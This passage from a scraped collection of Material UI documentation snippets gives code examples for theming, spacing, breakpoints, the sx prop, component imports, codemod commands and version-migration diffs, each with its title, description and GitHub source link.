colorInfo\n-.MuiButton-containedWarning\n+.MuiButton-contained.MuiButton-colorWarning\n-.MuiButton-textSizeSmall\n+.MuiButton-text.MuiButton-sizeSmall\n-.MuiButton-textSizeMedium\n+.MuiButton-text.MuiButton-sizeMedium\n-.MuiButton-textSizeLarge\n+.MuiButton-text.MuiButton-sizeLarge\n-.MuiButton-outlinedSizeSmall\n+.MuiButton-outlined.MuiButton-sizeSmall\n-.MuiButton-outlinedSizeMedium\n+.MuiButton-outlined.MuiButton-sizeMedium\n-.MuiButton-outlinedSizeLarge\n+.MuiButton-outlined.MuiButton-sizeLarge\n-.MuiButton-containedSizeSmall\n+.MuiButton-contained.MuiButton-sizeSmall\n-.MuiButton-containedSizeMedium\n+.MuiButton-contained.MuiButton-sizeMedium\n-.MuiButton-containedSizeLarge\n+.MuiButton-contained.MuiButton-sizeLarge\n-.MuiButton-root .MuiButton-iconSizeSmall\n+.MuiButton-root.MuiButton-sizeSmall > .MuiButton-icon\n-.MuiButton-root .MuiButton-iconSizeMedium\n+.MuiButton-root.MuiButton-sizeMedium > .MuiButton-icon\n-.MuiButton-root .MuiButton-iconSizeLarge\n+.MuiButton-root.MuiButton-sizeLarge > .MuiButton-icon\n```\n\n----------------------------------------\n\nTITLE: Custom Function-based Spacing\nDESCRIPTION: Demonstrates implementing custom spacing using a function that returns rem units (Bootstrap-style approach)\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/spacing/spacing.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst theme = createTheme({\n  spacing: (factor) => `${0.25 * factor}rem`, // (Bootstrap strategy)\n});\n\ntheme.spacing(2); // = 0.25 * 2rem = 0.5rem = 8px\n```\n\n----------------------------------------\n\nTITLE: Applying Text Colors with Material-UI Box Component\nDESCRIPTION: This snippet shows how to set text colors using the 'color' prop of the Box component. It demonstrates various color options from the Material-UI palette, including primary, secondary, error, warning, info, success, and different text variants.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/palette/palette.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ color: 'primary.main' }}>…\n<Box sx={{ color: 'secondary.main' }}>…\n<Box sx={{ color: 'error.main' }}>…\n<Box sx={{ color: 'warning.main' }}>…\n<Box sx={{ color: 'info.main' }}>…\n<Box sx={{ color: 'success.main' }}>…\n<Box sx={{ color: 'text.primary' }}>…\n<Box sx={{ color: 'text.secondary' }}>…\n<Box sx={{ color: 'text.disabled' }}>…\n```\n\n----------------------------------------\n\nTITLE: Using String-based Background Values with Emotion\nDESCRIPTION: Example of the correct way to specify background values using string-based syntax with Emotion instead of JSS array-based syntax.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\nconst theme = createTheme({\n  components: {\n    MuiBox: {\n      styleOverrides: {\n        root: {\n          background:\n            'url(image1.png) no-repeat top, url(image2.png) no-repeat center !important',\n        },\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring Timezone in MUI X TimePicker (TSX)\nDESCRIPTION: This TSX snippet demonstrates how to configure the timezone for the MUI X `TimePicker` component using the `timezone` prop. It requires the `TimePicker` component and typically state variables for value management (`value`, `setValue`). The example sets the timezone to 'Pacific/Honolulu', causing the component to display and handle time relative to that zone.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-mid-v6-features.md#2025-04-22_snippet_0\n\nLANGUAGE: tsx\nCODE:\n```\n<TimePicker\n  value={value}\n  onChange={setValue}\n  timezone=\"Pacific/Honolulu\" // Can be in any timezone of your choice\n  label={'Rendered in \"Pacific/Honolulu\"'}\n/>\n```\n\n----------------------------------------\n\nTITLE: Updating Custom Components with sx Prop\nDESCRIPTION: This snippet shows how to update custom components that use the sx prop with Pigment CSS.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_18\n\nLANGUAGE: diff\nCODE:\n```\n import ButtonBase from '@mui/material/ButtonBase';\n\n function ActiveButton({ sx, ...props }) {\n   return (\n     <ButtonBase\n       sx={[\n         {\n           '&:active': {\n             opacity: 0.5,\n           },\n         },\n-        ...Array.isArray(sx) ? sx : [sx],\n       ]}\n       {...props}\n     />\n   );\n }\n```\n\n----------------------------------------\n\nTITLE: Running Table Props Codemod Command\nDESCRIPTION: Command to execute the table-props codemod on a specified path. This updates Table component props to match the renamed API properties in v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_111\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/table-props <path>\n```\n\n----------------------------------------\n\nTITLE: Loading Material Icons Font\nDESCRIPTION: HTML code to load the Material Icons font from Google Web Fonts, which is required when using the Icon component with Material Icons.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/icons/icons.md#2025-04-22_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<link\n  rel=\"stylesheet\"\n  href=\"https://fonts.googleapis.com/icon?family=Material+Icons\"\n/>\n```\n\n----------------------------------------\n\nTITLE: Disabling Modal Outline in React\nDESCRIPTION: This snippet demonstrates how to disable the outline (often blue or gold) of a Modal component using CSS.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/modal/modal.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\n<Modal outline={0} />\n```\n\n----------------------------------------\n\nTITLE: Importing Stepper Components in React\nDESCRIPTION: This snippet shows how to import the basic Stepper components from Material-UI. It includes the main Stepper container, individual Step, and StepLabel components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/steppers/steppers.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Stepper from '@mui/material/Stepper';\nimport Step from '@mui/material/Step';\nimport StepLabel from '@mui/material/StepLabel';\n```\n\n----------------------------------------\n\nTITLE: Paper Component HTML Structure\nDESCRIPTION: The basic HTML structure of the Paper component showing its root element and content placement.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/paper/paper.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<div class=\"MuiPaper-root\">\n  <!-- Paper contents -->\n</div>\n```\n\n----------------------------------------\n\nTITLE: Inline Style Object with SX Prop\nDESCRIPTION: An alternative solution is to pass the style object directly to the SX prop. TypeScript correctly infers literal types when the object is defined inline, avoiding the type widening issue.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/the-sx-prop/the-sx-prop.md#2025-04-22_snippet_23\n\nLANGUAGE: typescript\nCODE:\n```\nexport default function App() {\n  return <Button sx={{ flexDirection: 'column' }}>Example</Button>;\n}\n```\n\n----------------------------------------\n\nTITLE: Using Both Theme Providers Simultaneously in React\nDESCRIPTION: Shows how to use both v0.x and v1.x versions of MuiThemeProvider together to support components from both versions during migration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v0x/migration-v0x.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport { MuiThemeProvider, createMuiTheme } from '@material-ui/core/styles'; // v1.x\nimport { MuiThemeProvider as V0MuiThemeProvider } from 'material-ui';\nimport getMuiTheme from 'material-ui/styles/getMuiTheme';\n\nconst theme = createMuiTheme({\n  /* theme for v1.x */\n});\nconst themeV0 = getMuiTheme({\n  /* theme for v0.x */\n});\n\nfunction App() {\n  return (\n    <MuiThemeProvider theme={theme}>\n      <V0MuiThemeProvider muiTheme={themeV0}>{/*Components*/}</V0MuiThemeProvider>\n    </MuiThemeProvider>\n  );\n}\n\nexport default App;\n```\n\n----------------------------------------\n\nTITLE: Variable Height Items in Masonry\nDESCRIPTION: Example of Masonry handling items with different heights, optimizing space by placing items in the shortest column.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/masonry/masonry.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nMasonryWithVariableHeightItems.js\n```\n\n----------------------------------------\n\nTITLE: Updating CssVarsProvider and extendTheme Imports in React\nDESCRIPTION: Updates to import statements for the now-stable CssVarsProvider and extendTheme APIs, removing the experimental prefixes used in v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_23\n\nLANGUAGE: diff\nCODE:\n```\n-import { experimental_extendTheme as extendTheme, Experimental_CssVarsProvider as CssVarsProvider } from '@mui/material/styles';\n+import { extendTheme, CssVarsProvider } from '@mui/material/styles';\n```\n\n----------------------------------------\n\nTITLE: Strict Mode Theme Configuration\nDESCRIPTION: Example of creating a theme that reduces warnings in React.StrictMode using unstable_createMuiStrictModeTheme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/theming/theming.md#2025-04-22_snippet_6\n\nLANGUAGE: js\nCODE:\n```\nimport { unstable_createMuiStrictModeTheme } from '@mui/material/styles';\n\nconst theme = unstable_createMuiStrictModeTheme();\n\nfunction App() {\n  return (\n    <React.StrictMode>\n      <ThemeProvider theme={theme}>\n        <LandingPage />\n      </ThemeProvider>\n    </React.StrictMode>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Sequential Order in Masonry\nDESCRIPTION: Shows how to implement sequential ordering of items from left to right instead of by column height.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/masonry/masonry.md#2025-04-22_snippet_7\n\nLANGUAGE: jsx\nCODE:\n```\nSequential.js\n```\n\n----------------------------------------\n\nTITLE: Customizing Grouping Behavior with groupingValueGetter (JavaScript)\nDESCRIPTION: This snippet shows how to use the groupingValueGetter property to customize the grouping behavior. In this example, it groups movies by decade instead of exact release date.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/introducing-the-row-grouping-feature.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\ngroupingValueGetter: ({ value }) => `${Math.floor(value.getFullYear() / 10)}0's`;\n```\n\n----------------------------------------\n\nTITLE: Importing Typography Component in React\nDESCRIPTION: Basic import statement for the Typography component from MUI Joy UI library.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/typography/typography.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Typography from '@mui/joy/Typography';\n```\n\n----------------------------------------\n\nTITLE: TypeScript Breakpoint Configuration\nDESCRIPTION: TypeScript module augmentation for custom breakpoint values in Material UI theme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/breakpoints/breakpoints.md#2025-04-22_snippet_3\n\nLANGUAGE: ts\nCODE:\n```\ndeclare module '@mui/material/styles' {\n  interface BreakpointOverrides {\n    xs: false; // removes the `xs` breakpoint\n    sm: false;\n    md: false;\n    lg: false;\n    xl: false;\n    mobile: true; // adds the `mobile` breakpoint\n    tablet: true;\n    laptop: true;\n    desktop: true;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Selection Propagation Configuration – TypeScript (React Tree View)\nDESCRIPTION: This TypeScript type defines the optional parameters for controlling selection propagation in the MUI Rich Tree View component. Developers can specify whether parent selection automatically selects descendants and whether selecting a descendant automatically selects parents. Both 'descendants' and 'parents' are optional boolean properties defaulting to false, providing granular configuration for complex selection mechanics.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v8.md#2025-04-22_snippet_2\n\nLANGUAGE: typescript\nCODE:\n```\ntype TreeViewSelectionPropagation = {\n  descendants?: boolean; // default: false\n  parents?: boolean; // default: false\n};\n```\n\n----------------------------------------\n\nTITLE: Configuring Pigment CSS with Next.js\nDESCRIPTION: Configuration setup for integrating Pigment CSS with Next.js using the withPigment plugin.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/experimental-api/pigment-css/pigment-css.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n// next.config.js\nimport { withPigment } from '@pigment-css/nextjs-plugin';\n\nexport default withPigment(nextConfig);\n```\n\n----------------------------------------\n\nTITLE: Migrating from Grid2 to Grid\nDESCRIPTION: Diff showing how to update imports, class names, and theme customization when using Grid2 (now renamed to Grid) in v7.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_8\n\nLANGUAGE: diff\nCODE:\n```\n    // imports\n-import Grid, { grid2Classes as gridClasses, Grid2Props as GridProps } from '@mui/material/Grid2';\n+import Grid, { gridClasses, GridProps } from '@mui/material/Grid';\n\n-import { Grid2 as Grid } from '@mui/material';\n+import { Grid } from '@mui/material';\n\n    // theme\n    const theme = createTheme({\n      components: {\n-    MuiGrid2: {\n+    MuiGrid: {\n          // ...\n        },\n      },\n    });\n\n    // CSS classes\n-.MuiGrid2-root\n+.MuiGrid-root\n```\n\n----------------------------------------\n\nTITLE: Running Grid Migration Codemod for Material UI v6\nDESCRIPTION: Command to automatically migrate Grid component props using the provided codemod tool. This helps convert from the old prop format to the new v6 format.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v6.0.0/grid-v2-props <path/to/folder>\n```\n\n----------------------------------------\n\nTITLE: Configuring Fixed AppBar with Template Frame\nDESCRIPTION: Example of adjusting AppBar positioning to account for template frame height using CSS variables.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/faq/faq.md#2025-04-22_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\n<AppBar\n  position=\"fixed\"\n  sx={{\n    top: 'var(--template-frame-height, 0px)',\n    // ...other styles\n  }}\n>\n```\n\n----------------------------------------\n\nTITLE: AccordionSummary Theme Override Update\nDESCRIPTION: Demonstrates the change in theme override configuration for AccordionSummary component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_2\n\nLANGUAGE: diff\nCODE:\n```\n createTheme({\n   components: {\n     MuiAccordionSummary: {\n       styleOverrides: {\n-        expandIcon: {\n+        expandIconWrapper: {\n          // ...\n         },\n       },\n     },\n   },\n });\n```\n\n----------------------------------------\n\nTITLE: Importing the styled Utility from MUI System or Material - TypeScript\nDESCRIPTION: This code provides two ways to import the styled utility into a TypeScript project. If you are using the general MUI System, you import from '@mui/system'. If working within @mui/material, you import from '@mui/material/styles'. No parameters are required for this import, but you must have one of these packages installed. The resultant styled function enables custom component styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/styled/styled.md#2025-04-22_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\nimport { styled } from '@mui/system';\n// If you are using @mui/material\nimport { styled } from '@mui/material/styles';\n```\n\n----------------------------------------\n\nTITLE: Custom ListSubheader Component Implementation\nDESCRIPTION: Example of creating a custom ListSubheader component with proper Material-UI integration\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/selects/selects.md#2025-04-22_snippet_3\n\nLANGUAGE: TypeScript\nCODE:\n```\nfunction MyListSubheader(props: ListSubheaderProps) {\n  return <ListSubheader {...props} />;\n}\n\nMyListSubheader.muiSkipListHighlight = true;\nexport default MyListSubheader;\n```\n\n----------------------------------------\n\nTITLE: CSS Modules Implementation for Slider\nDESCRIPTION: Shows how to style a Slider component using CSS Modules. The example includes both the CSS module file and the component file that imports and applies the styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_11\n\nLANGUAGE: css\nCODE:\n```\n.slider {\n  color: #20b2aa;\n}\n\n.slider:hover {\n  color: #2e8b57;\n}\n```\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport Slider from '@mui/material/Slider';\n// webpack, Parcel or else will inject the CSS into the page\nimport styles from './CssModulesSlider.module.css';\n\nexport default function CssModulesSlider() {\n  return (\n    <div>\n      <Slider defaultValue={30} />\n      <Slider defaultValue={30} className={styles.slider} />\n    </div>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Migrating FormControlLabel Props to Slots API\nDESCRIPTION: Transforms FormControlLabel component from using the deprecated componentsProps to the new slotProps API pattern.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_33\n\nLANGUAGE: diff\nCODE:\n```\n <FormControlLabel\n-  componentsProps={{ typography: typographyProps }}\n+  slotProps={{ typography: typographyProps }}\n />\n```\n\n----------------------------------------\n\nTITLE: TypeScript Module Augmentation for Custom Breakpoints in Grid Component\nDESCRIPTION: This code snippet shows how to extend the theme breakpoints interface in TypeScript to support custom breakpoint names. This allows you to use custom breakpoint names as responsive props in the Grid component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/components/grid/grid.md#2025-04-22_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ndeclare module '@mui/system' {\n  interface BreakpointOverrides {\n    // Your custom breakpoints\n    laptop: true;\n    tablet: true;\n    mobile: true;\n    desktop: true;\n    // Remove default breakpoints\n    xs: false;\n    sm: false;\n    md: false;\n    lg: false;\n    xl: false;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Disabling Focus Enforcement in React Modal\nDESCRIPTION: This snippet demonstrates how to disable the focus trap behavior of the Modal component, which can be necessary when users need to interact with other parts of the page.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/modal/modal.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\n<Modal disableEnforceFocus />\n```\n\n----------------------------------------\n\nTITLE: Configuring Material UI Theme for Pigment CSS\nDESCRIPTION: A diff snippet showing how to configure the Material UI theme to work with Pigment CSS by enabling CSS variables.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_7\n\nLANGUAGE: diff\nCODE:\n```\n+import { createTheme } from '@mui/material';\n\n const pigmentConfig = {\n   transformLibraries: ['@mui/material'],\n+  theme: createTheme({\n+    cssVariables: true,\n+    /* other parameters, if any */\n+  }),\n };\n```\n\n----------------------------------------\n\nTITLE: Styling Deeper Elements with CSS Modules and Global Selector\nDESCRIPTION: Demonstrates how to style child elements of a Material-UI component using CSS Modules with the :global selector to target the MuiSlider-thumb class.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_14\n\nLANGUAGE: css\nCODE:\n```\n.slider {\n  color: #20b2aa;\n}\n\n.slider:hover {\n  color: #2e8b57;\n}\n\n.slider :global .MuiSlider-thumb {\n  border-radius: 1px;\n}\n```\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\n// webpack, Parcel or else will inject the CSS into the page\nimport styles from './CssModulesSliderDeep1.module.css';\nimport Slider from '@mui/material/Slider';\n\nexport default function CssModulesSliderDeep1() {\n  return (\n    <div>\n      <Slider defaultValue={30} />\n      <Slider defaultValue={30} className={styles.slider} />\n    </div>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Disabling Color Scheme in CssBaseline and ScopedCssBaseline\nDESCRIPTION: This snippet shows how to disable the default CSS color-scheme by using the disableColorScheme prop with both CssBaseline and ScopedCssBaseline components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/css-baseline/css-baseline.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<CssVarsProvider>\n  <CssBaseline disableColorScheme />\n</CssVarsProvider>\n\n// or\n<CssVarsProvider>\n  <ScopedCssBaseline disableColorScheme >\n    {/* The rest of your application */}\n  </ScopedCssBaseline>\n</CssVarsProvider>\n```\n\n----------------------------------------\n\nTITLE: Running ListItem Button Migration Codemod for Material UI v6\nDESCRIPTION: Command to run the codemod that automatically converts ListItem components with button prop to the new ListItemButton component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v6.0.0/list-item-button-prop <path/to/folder>\n```\n\n----------------------------------------\n\nTITLE: Extending HTMLAttributes for TypeScript sx Prop Support\nDESCRIPTION: This snippet shows how to extend the HTMLAttributes interface to support the sx prop in TypeScript.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_24\n\nLANGUAGE: typescript\nCODE:\n```\nimport type { Theme, SxProps } from '@mui/material/styles';\n\ndeclare global {\n  namespace React {\n    interface HTMLAttributes<T> {\n      sx?: SxProps<Theme>;\n    }\n    interface SVGProps<T> {\n      sx?: SxProps<Theme>;\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: AccordionSummary CSS Class Renaming\nDESCRIPTION: Shows the change in CSS class names from expandIcon to expandIconWrapper.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_1\n\nLANGUAGE: diff\nCODE:\n```\n-'.MuiAccordionSummary-expandIcon': {\n+'.MuiAccordionSummary-expandIconWrapper': {\n```\n\n----------------------------------------\n\nTITLE: Updating theme.palette.augmentColor in Material-UI v5\nDESCRIPTION: This snippet shows the change in signature for the theme.palette.augmentColor helper function in Material-UI v5. It now requires an object with color and name properties instead of just the color value.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_51\n\nLANGUAGE: diff\nCODE:\n```\n-theme.palette.augmentColor(red);\n+theme.palette.augmentColor({ color: red, name: 'brand' });\n```\n\n----------------------------------------\n\nTITLE: Importing List Item Decorator Component in React\nDESCRIPTION: Shows how to import the ListItemDecorator component, which is used to add icons or other decorative elements to list items.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/list/list.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport ListItemDecorator from '@mui/joy/ListItemDecorator';\n```\n\n----------------------------------------\n\nTITLE: Updating Menu Transition Props in React\nDESCRIPTION: Replaces individual transition event props with a single TransitionProps object in Menu components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_21\n\nLANGUAGE: diff\nCODE:\n```\n <Menu\n-  onEnter={onEnter}\n-  onEntered={onEntered}\n-  onEntering={onEntering}\n-  onExit={onExit}\n-  onExited={onExited}\n-  onExiting={onExiting}\n+  TransitionProps={{\n+    onEnter,\n+    onEntered,\n+    onEntering,\n+    onExit,\n+    onExited,\n+    onExiting,\n+  }}\n >\n```\n\n----------------------------------------\n\nTITLE: Integrating Joy UI Link with React Router\nDESCRIPTION: Demonstrates how to use the Joy UI Link component with React Router. It uses the 'component' prop to render the Link as a React Router Link component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/link/link.md#2025-04-22_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nimport { Link as RouterLink } from 'react-router';\nimport Link from '@mui/joy/Link';\n\n<Link component={RouterLink} to=\"/docs\">\n  Read doc\n</Link>;\n```\n\n----------------------------------------\n\nTITLE: Setting Border Radius with Material-UI Box Component\nDESCRIPTION: Examples of applying different border radius values using the Box component with the sx prop. Shows percentage, theme-based, and explicit pixel values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/borders/borders.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ borderRadius: '50%' }}>…\n<Box sx={{ borderRadius: 1 }}>… // theme.shape.borderRadius * 1\n<Box sx={{ borderRadius: '16px' }}>…\n```\n\n----------------------------------------\n\nTITLE: Migrating Drop Down Menu from v0.x to v1.x\nDESCRIPTION: Shows the changes needed to migrate Drop Down Menu components from Material-UI v0.x to v1.x using the new Select component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v0x/migration-v0x.md#2025-04-22_snippet_12\n\nLANGUAGE: diff\nCODE:\n```\n-import DropDownMenu from 'material-ui/DropDownMenu';\n+import Select from '@material-ui/core/Select';\n\n-<DropDownMenu></DropDownMenu>\n+<Select value={this.state.value}></Select>\n```\n\n----------------------------------------\n\nTITLE: Implementing Zero Value Display in Badge\nDESCRIPTION: Shows how to handle zero values in badges using the showZero prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/badges/badges.md#2025-04-22_snippet_4\n\nLANGUAGE: JSX\nCODE:\n```\nShowZeroBadge.js\n```\n\n----------------------------------------\n\nTITLE: Updating Import Path for MUI System Components (Diff)\nDESCRIPTION: This diff illustrates the required change for importing MUI System components like `Box` in v7. Deep imports (more than one level) are no longer allowed due to the updated package layout using Node.js exports. You must now import directly from the component's top-level export.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_0\n\nLANGUAGE: diff\nCODE:\n```\n-import Box from '@mui/system/Box/Box';\n+import Box from '@mui/system/Box';\n```\n\n----------------------------------------\n\nTITLE: Updating StylesProvider Import Path\nDESCRIPTION: Diff showing the updated import path for StylesProvider, which was moved from @mui/material/styles to @mui/styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_32\n\nLANGUAGE: diff\nCODE:\n```\n-import { StylesProvider } from '@mui/material/styles';\n+import { StylesProvider } from '@mui/styles';\n```\n\n----------------------------------------\n\nTITLE: Customizing Avatar Sizes in React\nDESCRIPTION: Shows how to change the size of the avatar using the 'height' and 'width' CSS properties.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/avatars/avatars.md#2025-04-22_snippet_3\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"SizeAvatars.js\"}\n```\n\n----------------------------------------\n\nTITLE: Using theme.breakpoints.not Example\nDESCRIPTION: Example of using theme.breakpoints.not to apply styles for all screens except the md breakpoint range.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/breakpoints/breakpoints.md#2025-04-22_snippet_7\n\nLANGUAGE: js\nCODE:\n```\nconst styles = (theme) => ({\n  root: {\n    backgroundColor: 'blue',\n    // Match [xs, md) and [md + 1, ∞)\n    //       [xs, md) and [lg, ∞)\n    //       [0px, 900px) and [1200px, ∞)\n    [theme.breakpoints.not('md')]: {\n      backgroundColor: 'red',\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Grid Component DOM Structure\nDESCRIPTION: HTML structure showing the anatomy of the Grid component, which consists of a single root div element with the MuiGrid-root class.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/grid/grid.md#2025-04-22_snippet_14\n\nLANGUAGE: html\nCODE:\n```\n<div class=\"MuiGrid-root\">\n  <!-- Grid contents -->\n</div>\n```\n\n----------------------------------------\n\nTITLE: Adding Custom Component Variants to MUI Theme (TSX)\nDESCRIPTION: Demonstrates adding a custom variant (`dashed`) to the `MuiButton` component definition within the theme. This allows applying specific styles when the `variant=\"dashed\"` and `color=\"error\"` props are used together. TypeScript declarations are updated to recognize the new variant.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-core-v5.md#2025-04-22_snippet_4\n\nLANGUAGE: tsx\nCODE:\n```\nimport { createTheme, Button } from '@mui/material';\n\n// 1. Extend the theme.\nconst theme = createTheme({\n  components: {\n    MuiButton: {\n      variants: [\n        {\n          props: { variant: 'dashed', color: 'error' },\n          style: {\n            border: '1px dashed red',\n            color: 'red',\n          }\n        }\n      ]\n    }\n  }\n});\n\n// 2. Update the Button's color prop options\ndeclare module '@mui/material/Button' {\n  interface ButtonPropsVariantOverrides {\n    dashed: true;\n  }\n}\n\n// 3. Profit\n<Button variant=\"dashed\" color=\"error\">\n  dashed\n</Button>\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom DataGrid Filter Panel Component in React (JSX)\nDESCRIPTION: This JSX snippet defines a functional React component `CustomFilterPanel` that wraps the default `GridFilterPanel` from `@mui/x-data-grid`. It passes all received props (`{...props}`) down to the `GridFilterPanel` while also explicitly setting the `columnsSort` prop to `'asc'`, customizing the column sorting behavior within the filter panel. This demonstrates extending default slot components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/making-customizable-components.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\nimport { GridFilterPanel } from '@mui/x-data-grid';\n\nfunction CustomFilterPanel(props) {\n  return <GridFilterPanel {...props} columnsSort=\"asc\" />;\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Card Component in React\nDESCRIPTION: Basic import statement for the Joy UI Card component which serves as a surface-level container for grouping related components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/card/card.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Card from '@mui/joy/Card';\n```\n\n----------------------------------------\n\nTITLE: Detecting System Color Scheme Mode in Joy UI\nDESCRIPTION: Uses the useColorScheme hook to detect whether the user's system preference is set to light or dark mode. This allows the application to respond to system settings.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/dark-mode/dark-mode.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport { useColorScheme } from '@mui/joy/styles';\n\nfunction SomeComponent() {\n  const { mode, systemMode } = useColorScheme();\n  console.log(mode); // \"system\"\n  console.log(systemMode); // \"light\" | \"dark\" based on the user's 